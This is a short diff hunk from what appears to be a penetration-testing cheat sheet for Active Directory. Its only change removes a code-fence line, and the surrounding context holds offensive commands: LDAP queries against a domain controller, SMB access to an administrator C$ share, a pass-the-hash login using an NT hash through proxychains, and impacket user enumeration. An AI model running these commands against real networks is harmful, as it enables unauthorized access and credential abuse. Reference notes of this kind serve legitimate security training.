@@ -2886,7 +2886,7 @@ ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b
 # smb
 smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
 proxychains smbclient '\\10.9.0.200\share$' -U 'vault.local/bob%357e1382f274f51526f1e263cef0f67d' --pw-nt-hash
-```
+
 # impacket get AD users
 proxychains GetADUsers.py -all -k -no-pass -dc-ip 172.16.83.168 complyedge.com/pete
 
